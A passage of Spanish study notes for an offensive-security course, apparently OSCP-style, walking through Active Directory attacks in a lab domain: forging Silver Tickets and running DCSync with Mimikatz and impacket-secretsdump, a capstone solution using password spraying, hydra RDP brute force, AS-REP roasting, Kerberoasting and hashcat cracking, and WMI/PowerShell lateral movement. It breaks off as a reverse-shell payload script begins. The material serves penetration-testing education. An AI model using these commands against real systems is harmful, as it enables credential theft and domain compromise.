Esta técnica es inmensamente poderosa si el dominio contiene cuentas de servicio con privilegios altos con contraseñas débiles, lo que no es poco común en muchas organizaciones. Sin embargo, si el SPN se ejecuta en el contexto de una cuenta de computadora, una cuenta de servicio administrada, o una cuenta de servicio administrada por un grupo, la contraseña se generará aleatoriamente, será compleja y tendrá 120 caracteres, lo que hará que el descifrado sea inviable.

<br />

#### 6.4. Silver Tickets.

En la sección anterior, obtuvimos y desciframos un hash TGS-REP para recuperar la contraseña de texto sin formato de un SPN. En esta sección, iremos un paso más allá y forjaremos nuestros propios *Service Tickets*.

Recordando el funcionamiento interno de la autenticación Kerberos, la aplicación en el servidor que se ejecuta en el contexto de la cuenta de servicio verifica los permisos del usuario de las membresías de grupo incluidas en el ticket de servicio. Sin embargo, la aplicación no verifica los permisos de usuario y grupo en el ticket de servicio en la mayoría de los entornos. En este caso, la aplicación confía ciegamente en la integridad del ticket de servicio, ya que está cifrado con un hash de contraseña que, en teoría, solo conocen la cuenta de servicio y el controlador de dominio.

Es decir, que algunas aplicaciones deciden el contexto de seguridad con el que interaccionamos con ella a través del service ticket, obviando una comprobación de nuestro usuario. 

La validación *Privilege Account Certified* (PAC) es un proceso de verificación opcional entre la aplicación SPN y el controlador de dominio. Si está habilitado, el usuario que se autentica en el servicio y sus privilegios son validados por el controlador de dominio. Afortunadamente para esta técnica de ataque, las aplicaciones de servicio rara vez realizan la validación de PAC.

Como ejemplo, si nos autenticamos en un servidor IIS que se ejecuta en el contexto de la cuenta de servicio _iis_service_ , la aplicación IIS determinará qué permisos tenemos en el servidor IIS según las membresías de grupo presentes en el ticket de servicio.

Con la contraseña de la cuenta de servicio o su hash NTLM asociado a mano, podemos falsificar nuestro propio ticket de servicio para acceder al recurso de destino (en nuestro ejemplo, la aplicación IIS) con los permisos que deseemos.

Este ticket creado a medida se conoce como *Silver Ticket* y, si el nombre principal del servicio se usa en varios servidores, el Silver Ticket se puede aprovechar contra todos ellos.

Para replicar un service ticket y crear un Silver Ticket necesitamos recopilar los siguientes datos:

- SPN password hash.
- Domain SID.
- Target SPN.

Veámos a modo de ejemplo un caso práctico. Supongámos que tenemos acceso a un host y queremos verificar si tenemos o no acceso a un servidor web. Esto lo comprobamos con **iwr**

```
PS C:\Users\jeff> iwr -UseDefaultCredentials http://web04
iwr :
401 - Unauthorized: Access is denied due to invalid credentials.
Server Error

  401 - Unauthorized: Access is denied due to invalid credentials.
  You do not have permission to view this directory or page using the credentials that you supplied.

At line:1 char:1
+ iwr -UseBasicParsing -UseDefaultCredentials http://web04
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-WebRequest], WebExc
   eption
    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand
```

El listado anterior revela que no tenemos acceso porque nuestras credenciales no son válidas. Es decir, que no estamos autorizados.

Dado que somos un administrador local en esta máquina donde _iis_service_ tiene una sesión establecida, podemos usar Mimikatz para recuperar el hash de la contraseña de SPN (hash NTLM de _iis_service_ ), que es la primera información que necesitamos para crear un ticket plateado.

Iniciemos PowerShell como Administrador y ejecutemos Mimikatz. Como ya aprendimos, podemos usar las contraseñas **de privilegio::debug** y **sekurlsa::logon** para extraer las credenciales de AD almacenadas en caché.

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 1147751 (00000000:00118367)
Session           : Service from 0
User Name         : iis_service
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/14/2022 4:52:14 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1109
        msv :
         [00000003] Primary
         * Username : iis_service
         * Domain   : CORP
         * NTLM     : 4d28cf5252d39971419580a51484ca09
         * SHA1     : ad321732afe417ebbd24d5c098f986c07872f312
         * DPAPI    : 1210259a27882fac52cf7c679ecf4443
...
```

El hash NTLM de la cuenta de servicio es la primera información que necesitamos para crear el *silver ticket*.

Ahora, obtengamos el SID del dominio, la segunda información que necesitamos. Podemos ingresar **whoami /user** para obtener el SID del usuario actual. Como alternativa, también podríamos recuperar el SID de la cuenta de usuario de SPN de la salida de Mimikatz, ya que las cuentas de usuario del dominio existen en el mismo dominio.

Como se explica en el apartado Windows Privilege Escalation , el SID consta de varias partes. Como solo nos interesa el SID del dominio, omitiremos el RID del usuario.

```
PS C:\Users\jeff> whoami /user

USER INFORMATION
----------------

User Name SID
========= =============================================
corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
```

El último elemento de la lista es el SPN de destino. Para este ejemplo, apuntaremos al recurso HTTP SPN en WEB04 ( _HTTP/web04.corp.com:80_ ) porque queremos acceder a la página web que se ejecuta en IIS.

Ahora que hemos recopilado las tres piezas de información, podemos construir el comando para crear un silver ticket con Mimikatz. Podemos crear el ticket de servicio falsificado con el módulo _kerberos::golden_ . Este módulo proporciona las capacidades para crear golden/silver tickets por igual. (El concepto de golden tickets se tratará más adelante).

Necesitamos proporcionar el SID del dominio ( **/sid:** ), el nombre del dominio ( **/domain:** ) y el destino donde se ejecuta el SPN ( **/target:** ). También necesitamos incluir el protocolo SPN ( **/service:** ), el hash NTLM del SPN ( **/rc4:** ) y la opción **/ptt** , que nos permite inyectar el ticket falsificado en la memoria de la máquina en la que ejecutamos el comando. .

Finalmente, debemos ingresar un usuario de dominio existente para **/usuario:**. Este usuario se establecerá en el ticket falsificado. Para este ejemplo, usaremos _jeffadmin_. Sin embargo, también podríamos usar cualquier otro usuario de dominio ya que podemos establecer los permisos y grupos nosotros mismos.

```
mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
User      : jeffadmin
Domain    : corp.com (CORP)
SID       : S-1-5-21-1987370270-658905905-1781884369
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 4d28cf5252d39971419580a51484ca09 - rc4_hmac_n
Service   : http
Target    : web04.corp.com
Lifetime  : 9/14/2022 4:37:32 AM ; 9/11/2032 4:37:32 AM ; 9/11/2032 4:37:32 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'jeffadmin @ corp.com' successfully submitted for current session

mimikatz # exit
Bye!
```

Se cargó en la memoria un nuevo ticket de servicio para el SPN _HTTP/web04.corp.com_ y Mimikatz estableció los permisos de membresía de grupo apropiados en el ticket falsificado. Desde la perspectiva de la aplicación IIS, el usuario actual será tanto el administrador local integrado ( _Relative Id: 500_ ) como un miembro de varios grupos con muchos privilegios, incluido el grupo de administradores de dominio ( _Relative Id: 512_ ), como se destacó anteriormente. .

Esto significa que deberíamos tener el ticket listo para usar en la memoria de nuestra sesión. Podemos confirmar esto con **klist** .

```
PS C:\Tools> klist

Current LogonId is 0:0xa04cc

Cached Tickets: (1)

#0>     Client: jeffadmin @ corp.com
        Server: http/web04.corp.com @ corp.com
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a00000 -> forwardable renewable pre_authent
        Start Time: 9/14/2022 4:37:32 (local)
        End Time:   9/11/2032 4:37:32 (local)
        Renew Time: 9/11/2032 4:37:32 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called:
```

Esto debería permitirnos acceder a la página web en WEB04 como _jeffadmin_ .

Verifiquemos nuestro acceso usando el mismo comando que antes.

```
PS C:\Tools> iwr -UseDefaultCredentials http://web04

StatusCode        : 200
StatusDescription : OK
Content           : <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
                    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
                    <html xmlns="http://www.w3.org/1999/xhtml">
                    <head>
                    <meta http-equiv="Content-Type" cont...
RawContent        : HTTP/1.1 200 OK
                    Persistent-Auth: true
                    Accept-Ranges: bytes
                    Content-Length: 703
                    Content-Type: text/html
                    Date: Wed, 14 Sep 2022 11:37:39 GMT
                    ETag: "b752f823fc8d81:0"
                    Last-Modified: Wed, 14 Sep 20...
Forms             :
Headers           : {[Persistent-Auth, true], [Accept-Ranges, bytes], [Content-Length, 703], [Content-Type,
                    text/html]...}
Images            : {}
InputFields       : {}
Links             : {@{outerHTML=<a href="http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409"><img
                    src="iisstart.png" alt="IIS" width="960" height="600" /></a>; tagName=A;
                    href=http://go.microsoft.com/fwlink/?linkid=66138&amp;clcid=0x409}}
ParsedHtml        :
RawContentLength  : 703
```

Falsificamos con éxito un ticket de servicio y obtuvimos acceso a la página web como _jeffadmin_ . Vale la pena señalar que realizamos este ataque sin acceso a la contraseña de texto sin formato o al hash de contraseña de este usuario.

Una vez que tengamos acceso al hash de la contraseña del SPN, una cuenta de máquina o un usuario, podemos falsificar los tickets de servicio relacionados para cualquier usuario y permiso. Esta es una excelente manera de acceder a los SPN en las fases posteriores de una prueba de penetración, ya que necesitamos acceso privilegiado en la mayoría de las situaciones para recuperar el hash de la contraseña del SPN.

<br />

#### 6.5. Domain Controller Synchronization.

**Presentación del concepto**

En entornos de producción, los dominios suelen depender de más de un controlador de dominio para proporcionar redundancia. El *Directory Replication Service* (DRS) Remote Protocol utiliza la *replicación* para sincronizar estos controladores de dominio redundantes. Un controlador de dominio puede solicitar una actualización para un objeto específico, como una cuenta, mediante la API _IDL_DRSGetNCChanges_.

Afortunadamente para nosotros, el controlador de dominio que recibe una solicitud de actualización no verifica si la solicitud proviene de un controlador de dominio conocido. En su lugar, solo verifica que el SID asociado tenga los privilegios adecuados. **Si intentamos enviar una solicitud de actualización no autorizada a un controlador de dominio de un usuario con ciertos derechos, tendrá éxito.**. Estos ciertos privilegios pueden ser enumerados a través de BloodHound.

Para iniciar dicha replicación, un usuario debe tener los derechos _Replicating Directory Changes_, _Replicating Directory Changes All_, and _Replicating Directory Changes in Filtered Set_ rights. De forma predeterminada, los miembros de _Domain Admins_, _Enterprise Admins_, and _Administrators_ tienen está clase de permisos asignados.

Si obtenemos acceso a una cuenta de usuario en uno de estos grupos o con estos derechos asignados, podemos realizar un ataque _dcsync_ en el que suplantamos a un controlador de dominio. **Esto nos permite solicitar cualquier credencial de usuario del dominio.**

<br />

**Mimikatz**

Para realizar este ataque, usaremos Mimikatz en una máquina Windows unida a un dominio e _impacket-secretsdump_ en nuestra máquina Kali no unida a un dominio para los ejemplos de esta sección.

```
PS C:\Users\jeffadmin> cd C:\Tools\

PS C:\Tools> .\mimikatz.exe
...

mimikatz # lsadump::dcsync /user:corp\dave
[DC] 'corp.com' will be the domain
[DC] 'DC1.corp.com' will be the DC server
[DC] 'corp\dave' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : dave

** SAM ACCOUNT **

SAM Username         : dave
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00410200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD DONT_REQUIRE_PREAUTH )
Account expiration   :
Password last change : 9/7/2022 9:54:57 AM
Object Security ID   : S-1-5-21-1987370270-658905905-1781884369-1103
Object Relative ID   : 1103

Credentials:
    Hash NTLM: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 0: 08d7a47a6f9f66b97b1bae4178747494
    ntlm- 1: a11e808659d5ec5b6c4f43c1e5a0972d
    lm  - 0: 45bc7d437911303a42e764eaf8fda43e
    lm  - 1: fdd7d20efbcaf626bd2ccedd49d9512d
...
```

Así, empleando un ataque de replicación ha conseguido el hash NTLM del usuario Dave.

<br/>

**impacket-secretsdump**

También podemos utilizar el dcsync attack desde Linux. Usaremos impacket-secretsdump para lograr esto. Para iniciarlo, ingresaremos el nombre de usuario de destino **dave** como argumento para **-just-dc-user** y proporcionaremos las credenciales de un usuario con los derechos necesarios, así como la IP del controlador de dominio en el formato dominio **/usuario: contraseña@ip** .

```
kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
dave:1103:aad3b435b51404eeaad3b435b51404ee:08d7a47a6f9f66b97b1bae4178747494:::
[*] Kerberos keys grabbed
dave:aes256-cts-hmac-sha1-96:4d8d35c33875a543e3afa94974d738474a203cd74919173fd2a64570c51b1389
dave:aes128-cts-hmac-sha1-96:f94890e59afc170fd34cfbd7456d122b
dave:des-cbc-md5:1a329b4338bfa215
[*] Cleaning up...
```

El Listado anterior muestra que obtuvimos con éxito el hash NTLM de _dave_ . El resultado de la herramienta indica que utiliza _DRSUAPI_, la API de Microsoft que implementa el protocolo remoto del servicio de replicación de directorios.

El ataque dcsync es una técnica poderosa para obtener cualquier credencial de usuario de dominio. Como beneficio adicional, podemos usarlo tanto desde Windows como desde Linux. Al hacerse pasar por un controlador de dominio, podemos usar la replicación para obtener credenciales de usuario de un controlador de dominio. Sin embargo, para realizar este ataque, necesitamos un usuario que sea miembro de _Domain Admins_ , _Enterprise Admins_ o _Administrators_ , porque se requieren ciertos derechos para iniciar la replicación. Alternativamente, podemos aprovechar un usuario con estos derechos asignados, aunque es mucho menos probable que nos encontremos con uno de estos en una prueba de penetración real.

<br />

**Capstone Exercises**

**2. Capstone Exercise: Once VM Group 2 is started, the domain corp.com has been modified. Use the techniques from this Module to obtain access to the user account maria and log in to the domain controller. To perform the initial enumeration steps you can use pete with the password Nexus123!. You'll find the flag on the Desktop of the domain administrator on DC1. If you obtain a hash to crack, create and utilize a rule file which adds nothing, a "1", or a "!" to the passwords of rockyou.txt.**

En primer lugar, nos logeamos a la máquina web04 con el usuario Pete y obtenemos mediante AS_REP las credenciales de mike con el nos logeamos en CLIENT75 como administradores y obtenemos los hashes de usuario con mimikatz entre los que se encuentra maria y nos logeamos en DC1.CORP obteniendo la flag.

<br />

**3. Capstone Exercise: Once VM Group 3 is started, the domain _corp.com_ has been modified. By examining leaked password database sites, you discovered that the password _VimForPowerShell123!_ was previously used by a domain user. Spray this password against the domain users _meg_ and _backupuser_. Once you have identified a valid set of credentials, use the techniques from this Module to obtain access to the domain controller. You'll find the flag on the Desktop of the domain administrator on DC1. If you obtain a hash to crack, reuse the rule file from the previous exercise.

En primer lugar, utilizamos crackmapexec para ver a qué usuario pertenece la contraseña propuesta por el enunciado:

```
for i in $(seq 0 5); do crackmapexec smb 192.168.216.7$i -u username.txt -p "VimForPowerShell123\!" -d CORP.COM --continue-on-success | grep "\[+\]";done 
SMB         192.168.216.70  445    DC1              [+] CORP.COM\meg:VimForPowerShell123!
[...]
```

Podemos ver que las credenciales pertenecer al usuario 'meg', sin embargo, podemos observar que estas credenciales no nos sirven para acceder a ninguna máquina:

```
for i in $(seq 2 5);do hydra rdp://192.168.216.7$i -l meg -p 'VimForPowerShell123!'; done                                                              
[...]
[3389][rdp] account on 192.168.216.72 might be valid but account not active for remote desktop: login: meg password: VimForPowerShell123!, continuing attacking the account.
[...]
```

Así, debemos proseguir con el ataque con estas credenciales desde fuera. 

Eso nos deja con la posibilidad de recuperar NTLM hash de usuarios vulnerable a AS-REP roasting . Ambos ataques se comprueban con el siguiente comando:

```
for i in 0 2 3 4 5;do impacket-GetNPUsers -dc-ip 192.168.216.7$i  -request -outputfile out$1 corp.com/meg:'VimForPowerShell123!';done 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Name  MemberOf                                  PasswordLastSet             LastLogon                   UAC      
----  ----------------------------------------  --------------------------  --------------------------  --------
dave  CN=Development Department,DC=corp,DC=com  2022-09-07 12:54:57.521205  2023-08-28 11:40:28.913019  0x410200
```

Intentamos crackear el hash:

```
hashcat -h | grep -i "AS-REP"                                                
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol


hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt -r rule.txt --force
hashcat (v6.2.6) starting

[...]

$krb5asrep$23$dave@CORP.COM:d49c866e528f744a73c2eac5afb3bf9f$b2fc712d88f17c294ef2e78236cde94503455b472894e6f59286b6111fef5daf9c74a3f055d544cae413880643b8554a9e6536f2dececc66e466ca950be6f54f7db9487c9d641f9027891218cb337e928c6506f22bbffc57e3e5ca70a57fe165c4c4eda96c88b50117776f873eab78dc4975fcad5e3c23b5edd1e7ec877e6d50ed983a22012514f2163cdda25d54f4c1b9ff4b3e3128791f61f406076d8bbc172d0eb456bc2562d5d6606155e248672fe789d55207a9684d9f02b30ba2348e7d06f8591525509b72b7f9c52210e05d50c355d8f92f1015def77bdca0016fdd6149a57f74:Flowers1

[...]
```

Ahora que hemos encontrando credenciales; dave:Flowers1, veámos sin con ellas podemos acceder a alguna máquina mediante rdp:

```
for i in $(seq 2 5);do hydra rdp://192.168.216.7$i -l dave -p 'Flowers1'; done                
[...]

[3389][rdp] host: 192.168.216.74   login: dave   password: Flowers1
1 of 1 target successfully completed, 1 valid password found

[...]

[3389][rdp] host: 192.168.216.75   login: dave   password: Flowers1
1 of 1 target successfully completed, 1 valid password found

[...]
```

Encontramos que hay dos máquinas a las que podemos acceder, CLIENT74 y CLIENT75. El siguiente paso es acceder a cada una de ellas con el usuario DAVE y proceder a realizar un exhaustivo proceso de enumeración.

Sin embargo no encontramos nada útil, encontramos que el usuario Backupuser tiene su hash vulnerable a Kerberoasting. Encontramos el hash, lo crackeamos y entramos en el DC:

```
sudo impacket-GetUserSPNs -request -dc-ip 192.168.216.70 corp.com/meg:'VimForPowerShell123!' 
[sudo] password for kali: 
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName    Name         MemberOf                                  PasswordLastSet             LastLogon                   Delegation    
----------------------  -----------  ----------------------------------------  --------------------------  --------------------------  -------------
http/files04.corp.com   backupuser   CN=Domain Admins,CN=Users,DC=corp,DC=com  2023-08-28 14:07:02.460079  <never>                                   
HTTP/web04.corp.com     iis_service                                            2022-09-07 08:38:43.411468  2023-03-01 06:40:02.088156  unconstrained 
HTTP/web04              iis_service                                            2022-09-07 08:38:43.411468  2023-03-01 06:40:02.088156  unconstrained 
HTTP/web04.corp.com:80  iis_service                                            2022-09-07 08:38:43.411468  2023-03-01 06:40:02.088156  unconstrained 



[-] CCache file is not found. Skipping...
$krb5tgs$23$*backupuser$CORP.COM$corp.com/backupuser*$be0754c1e91e633f32ed60f5a19fcf97$9d91810831f9e1ab019f8e1ae9886322f5ffc45ef67425e6dd8a2bed57ccd86fc1152f223e70ba5689cf8a42c0e1bc5932b6c52f1f715631dbef021914d12550d4d37f86ed141a8cb54b53f27d3ec6046eeb474631673118796e4e7b8ec3e61638940f2f9206e7ec080221848c4367b27c4ff253bad66d30789de45263169e8bceb93cf16ce9bc713761e4f99a27ac3fcc949c515aa3e0d88ab1de75ee2b1752678b67b74095710cbbe64231d285bd36e5edced8daa1aad7260efd66e97f53bc7c40b18fd371641062aa0d74348af9dac9fab66e553aed3e006c1129bde7e13d06ffa940dfd4a8f388d9c2d57a8ed76226b5b65104a65477b57a2d447c772950f142932dfee942d045c06782bc338761585247ca0618e208e4ef02556ad9981791db72229e0253b96940729af6b808c5738221c6efaf0f7fd3ddb5a7492315ebb32b9a86f5c7a6141f22419e97675e80a8807a7d6cc2c8b88518d2d27068f1000362b2afc4d488548ea65172c3819a2ad8b435b77b424fb2993af6fdb6ff62487425f76a9b70d18aa83312e9f5d8a16f90db18f6fb708c26503a8e6d468b3831c19f3e4af6a25753d5d3773cd0e0adf7a37b7761d43947bd4414376276bd1445d25ef73190b793fbdd9de6b45cd8d95547d2e1cbf0fa880b3af6fb391eea74dab298f8cd8d1e733f562f92dbd0255af1273d33c5138df2669f62164ae52bc6f78201f7825a3be54c0b2e311800f1778c7e0e649596c1fdb8df1f6a243f480672d4477efc8c01908f62bf59afdcb51c5bafd93ff84136ca76f73f4eb6fa1dfbcb29dcb40bf69c4ad943e34b266b992061324a78688a80df76de532fca7625820da1d40949b6223e89bc3b0de621536eec0dfbb49edf9a04a0ddde81baeb154e08c60b079cb3e7c6502cc4ac952bcc85df34a6c31c06f6cfe96540f3f96ea5f8ef4e1d071257ac194d8bf8183e4e6a5cc69d56b7fbea5322868610e0900a03faf73bf8c77168910710f61b8220155c3d058d6f019cfe7949795424732bdfd773bfa36002098036d4953213d71b1cff389fca2128c2f7bf30ed39523e38f24d6f3f2ccae7874c1689f38b1df344cf58a7ba1dabb335fe9c9d425c7925f847ac9b87bf87db42af46d77428d7fe168bca12a83eb16634a05327fece03edfe45caa3c448704bb8d53247aa81cb51cc1428d06ef221796af8c33d10c10f82bdb6c8496e565274cf46943f656110091f1f7892967c95097e781fb1349e831977be5e1e1154a803f8518c39f5d9b1d72178c244c2a4e28ffe581bf3fdd2ce6c04

```

<br />

```
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt -r rule.txt --force                                                          
hashcat (v6.2.6) starting

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-11th Gen Intel(R) Core(TM) i7-11370H @ 3.30GHz, 2910/5884 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 3

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Sal

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 43033155

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*backupuser$CORP.COM$corp.com/backupuser*$be0754c1e91e633f32ed60f5a19fcf97$9d91810831f9e1ab019f8e1ae9886322f5ffc45ef67425e6dd8a2bed57ccd86fc1152f223e70ba5689cf8a42c0e1bc5932b6c52f1f715631dbef021914d12550d4d37f86ed141a8cb54b53f27d3ec6046eeb474631673118796e4e7b8ec3e61638940f2f9206e7ec080221848c4367b27c4ff253bad66d30789de45263169e8bceb93cf16ce9bc713761e4f99a27ac3fcc949c515aa3e0d88ab1de75ee2b1752678b67b74095710cbbe64231d285bd36e5edced8daa1aad7260efd66e97f53bc7c40b18fd371641062aa0d74348af9dac9fab66e553aed3e006c1129bde7e13d06ffa940dfd4a8f388d9c2d57a8ed76226b5b65104a65477b57a2d447c772950f142932dfee942d045c06782bc338761585247ca0618e208e4ef02556ad9981791db72229e0253b96940729af6b808c5738221c6efaf0f7fd3ddb5a7492315ebb32b9a86f5c7a6141f22419e97675e80a8807a7d6cc2c8b88518d2d27068f1000362b2afc4d488548ea65172c3819a2ad8b435b77b424fb2993af6fdb6ff62487425f76a9b70d18aa83312e9f5d8a16f90db18f6fb708c26503a8e6d468b3831c19f3e4af6a25753d5d3773cd0e0adf7a37b7761d43947bd4414376276bd1445d25ef73190b793fbdd9de6b45cd8d95547d2e1cbf0fa880b3af6fb391eea74dab298f8cd8d1e733f562f92dbd0255af1273d33c5138df2669f62164ae52bc6f78201f7825a3be54c0b2e311800f1778c7e0e649596c1fdb8df1f6a243f480672d4477efc8c01908f62bf59afdcb51c5bafd93ff84136ca76f73f4eb6fa1dfbcb29dcb40bf69c4ad943e34b266b992061324a78688a80df76de532fca7625820da1d40949b6223e89bc3b0de621536eec0dfbb49edf9a04a0ddde81baeb154e08c60b079cb3e7c6502cc4ac952bcc85df34a6c31c06f6cfe96540f3f96ea5f8ef4e1d071257ac194d8bf8183e4e6a5cc69d56b7fbea5322868610e0900a03faf73bf8c77168910710f61b8220155c3d058d6f019cfe7949795424732bdfd773bfa36002098036d4953213d71b1cff389fca2128c2f7bf30ed39523e38f24d6f3f2ccae7874c1689f38b1df344cf58a7ba1dabb335fe9c9d425c7925f847ac9b87bf87db42af46d77428d7fe168bca12a83eb16634a05327fece03edfe45caa3c448704bb8d53247aa81cb51cc1428d06ef221796af8c33d10c10f82bdb6c8496e565274cf46943f656110091f1f7892967c95097e781fb1349e831977be5e1e1154a803f8518c39f5d9b1d72178c244c2a4e28ffe581bf3fdd2ce6c04:DonovanJadeKnight1
                                                          
Session..........: hashca
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*backupuser$CORP.COM$corp.com/backupuse...ce6c04
Time.Started.....: Mon Aug 28 17:26:25 2023, (13 secs)
Time.Estimated...: Mon Aug 28 17:26:38 2023, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (rule.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2693.1 kH/s (2.81ms) @ Accel:512 Loops:3 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 33675264/43033155 (78.25%)
Rejected.........: 0/33675264 (0.00%)
Restore.Point....: 11222016/14344385 (78.23%)
Restore.Sub.#1...: Salt:0 Amplifier:0-3 Iteration:0-3
Candidate.Engine.: Device Generator
Candidates.#1....: DrjH@69270 -> Donatellaversace!
Hardware.Mon.#1..: Util: 84%

Started: Mon Aug 28 17:26:25 2023
Stopped: Mon Aug 28 17:26:39 2023

```

<br />
### 7. Active Directory Lateral Movement Techniques.

El *lateral movement* es una táctica o un conjunto de técnicas que van dirigidas a ganar acceso de varios hosts dentro de una red.

<br />

#### 7.1. Lateral Movement Techniques.

##### 7.1.1. WMI and WinRM.

La primera técnica de movimiento lateral que vamos a cubrir consiste en el uso de WMI, Windows Management Instrumentation, que es una utilidad orientada a la automatización de tareas. Concretamente, nos aprovecharemos de una funcionalidad por la cual *wmic* es capaz de crear procesos a través del método *Create* de la clase *Win32_Process*. Esta se comunica a través de RPC (135/tcp) y desvía la sesión a un puerto de alto rango (19152-65535).

De esta forma, si tenemos credenciales de otro usuario con permisos en una máquina remota, podemos aprovechar este vector de pivoting para crear un proceso que spawnee una shell 

<br />

**WMI Utility**

En primer lugar, **necesitamos alguien con privilegios administrativos (Administrator Local Group) y que sea un usuario de dominio (Domain User)**, esto es; cuya cuenta esté almacenada en el controlador de dominio en lugar de en una computadora local para poder utilizar la utilidad WMI. 

Supongamos que hemos conseguido acceso a un usuario de estas características, *jen*. 

Las restricciones de la UAC no aplican para usuarios de dominio.

De esta forma podemos pivotar a lo largo de la red a través del siguiente comando:

```
C:\Users\jeff>wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 752;
        ReturnValue = 0;
};
```

Observemos que la respuesta de la aplicación nos devuelve el PID del proceso creado y el valor de retorno que al ser 0, indica que el proceso se ha creado sin problemas.

<br />

**Powershell**

Sin embargo, recientemente, WMI ha sido retirada y en su lugar aprenderemos a realizar la misma operación a través de PowerShell.

Trasladar este ataque a la sintaxis de PowerShell impone la necesidad de saber unos cuantos detalles más.

- En primer lugar, creamos un objeto de credenciales en PowerShell para crear las credenciales de nuestro usuario que se guardan en la variable \$crendentials.

	```
	$username = 'jen';
	$password = 'Nexus123!';
	$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
	$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
	```

- Por otra parte, creamos un objeto que nos permita crear remotamente un proceso con nuestro usuario. El comando se guarda en la variable \$command.

	```
	$options = New-CimSessionOption -Protocol DCOM
	$session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options 
	$command = 'calc';
	```

- Por último, invocamos el método *Create* de la clase *Win32_Process* como lo haría la herramienta WMI:

	```
	Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
	```

El script en su totalidad quedaría de la siguiente manera:

```powershell
#Creds store part.
$username = '<targetusername>';
$password = '<targetpassword>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

#Command Object part.
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName <TARGETIP> -Credential $credential -SessionOption $Options 
$command = '<PAYLOAD>';

#Invoking Create method.
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

<br />

Una vez tenemos configurado el exploit, podemos centrarnos en al construcción del payload que consistirá en una reverse shell codificada en base64 que obtendremos del siguiente código en python.

```python
import sys
import base64

